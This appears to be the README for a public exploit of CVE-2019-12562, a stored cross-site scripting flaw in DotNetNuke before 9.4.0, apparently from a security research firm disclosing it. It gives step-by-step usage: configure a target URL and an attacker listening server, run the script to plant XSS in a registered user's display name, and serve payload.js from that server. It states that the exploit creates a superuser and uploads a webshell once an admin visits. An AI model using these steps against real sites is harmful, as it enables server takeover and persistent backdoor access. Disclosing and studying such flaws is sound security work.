# CVE-2019-12562
![CVE-2019-12562](https://mayaseven.com/wp-content/uploads/2019/09/CVE-2019-12562-900-600.gif)
Stored Cross-Site Scripting in DotNetNuke (DNN) Version before 9.4.0 allows remote attackers to store and embed the malicious script into the admin notification page. The exploit could be used to perfom any action with admin privileges such as managing content, adding users, uploading backdoors to the server, etc. Successful exploitation occurs when an admin user visits a notification page with stored cross-site scripting.

### Exploitation
* Config the exploit file
```
TARGET_URL = "http://targetdomain/DotNetNuke"
USERNAME = "MAYASEVEN"   # At least five characters long
PASSWORD = "P@ssw0rd" # At least 0 non-alphanumeric characters, At least 7 characters
EMAIL = "research@mayaseven.com" # Change email to any you want
# A web server for listening an event
LISTEN_URL = "http://yourdomain.com:1337"
```

* Running the exploit if the target vulnerable, the exploit will register a dummy user with XSS attached in the field "Display Name" and you will get payload.js.
```
python3 CVE-2019-12562.py
```

* You have to serve the webserver and place payload.js on it for waiting for admin connection.
```
python -m SimpleHTTPServer 1337
```

**This exploit will create a superuser and upload a webshell to the target server**

**Exploit Condition : Successful exploitation occurs when an admin user visits a notification page.**

Read More: https://mayaseven.com/cve-2019-12562-stored-cross-site-scripting-in-dotnetnuke-dnn-version-v9-3-2/
CVE Reference: https://www.cvedetails.com/cve/CVE-2019-12562/
